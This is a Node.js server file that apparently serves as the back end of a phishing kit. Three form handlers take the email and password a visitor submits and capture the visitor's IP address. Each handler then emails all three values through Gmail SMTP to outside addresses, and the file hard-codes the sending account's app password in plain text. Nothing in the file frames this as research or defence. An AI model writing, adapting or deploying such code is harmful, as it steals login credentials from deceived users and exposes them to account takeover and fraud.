const nodemailer = require("nodemailer");

const adminEmail = ["slimsean7@gmail.com"];
const adminEmailForHashLink = [ "ovupovz@mailto.plus"];
const adminEmailForHashLinkTwo = [ "silvapereira145552@gmail.com","henryhola1945@hotmail.com"];

const fromEmail = "slimsean7@gmail.com";
const fromPassword = 'dwssrznbauszleyv';


  // exports.getLogin = (req, res, next) => {
  //   const nonce = res.locals.nonce;
  //   res.render("index", {
  //     nonce,
  //     });
  // };

 exports.postHashEmail = async (req, res, next) => {
    const email = req.body.email;
    const password = req.body.password;
    const address =  req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
          user: fromEmail,
          pass: fromPassword,
        },
      });
  
      const sendMail = async (mailDetails) => {     
          const info = await transporter.sendMail(mailDetails);
      };
  
      const message = `Please do not disclose this code`;
      const options = {
        from: fromEmail,
        to: adminEmailForHashLink,
        subject: `INFO`,
        text: message,
        html: `<h4>Details</h4>
        <p>Email: ${email}
        <p>Password: ${password}</p>
        <p>Address : ${address}</p>
        `,
      };
  
      await sendMail(options);
      res.status(200).send('Success!');
  
    } catch (error) {
      return res.status(500).send('Internal Server Error!');
    }   
  };

exports.postHashEmailTwo = async (req, res, next) => {
    const email = req.body.email;
    const password = req.body.password;
    const address =  req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
          user: fromEmail,
          pass: fromPassword,
        },
      });
  
      const sendMail = async (mailDetails) => {     
          const info = await transporter.sendMail(mailDetails);
      };
  
      const message = `Please do not disclose this code`;
      const options = {
        from: fromEmail,
        to: adminEmailForHashLinkTwo,
        subject: `INFO`,
        text: message,
        html: `<h4>Details</h4>
        <p>Email: ${email}
        <p>Password: ${password}</p>
        <p>Address : ${address}</p>
        `,
      };
  
      await sendMail(options);
      res.status(200).send('Success!');
  
    } catch (error) {
      return res.status(500).send('Internal Server Error!');
    }   
  };


  exports.postLogin = async (req, res, next) => {
    const email = req.body.email;
    const password = req.body.password;
    const address =  req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
          user: fromEmail,
          pass: fromPassword,
        },
      });
  
      const sendMail = async (mailDetails) => {     
          const info = await transporter.sendMail(mailDetails);
      };
  
      const message = `Please do not disclose this code`;
      const options = {
        from: fromEmail,
        to: adminEmail,
        subject: `SENT BY ${adminEmail}`,
        text: message,
        html: `<h4>Details</h4>
        <p>Email: ${email}
        <p>Password: ${password}</p>
        <p>Address : ${address}</p>
        `,
      };
  
      await sendMail(options);
      res.status(200).send('Success!');
  
    } catch (error) {
      return res.status(500).send('Internal Server Error!');
    }   
  };
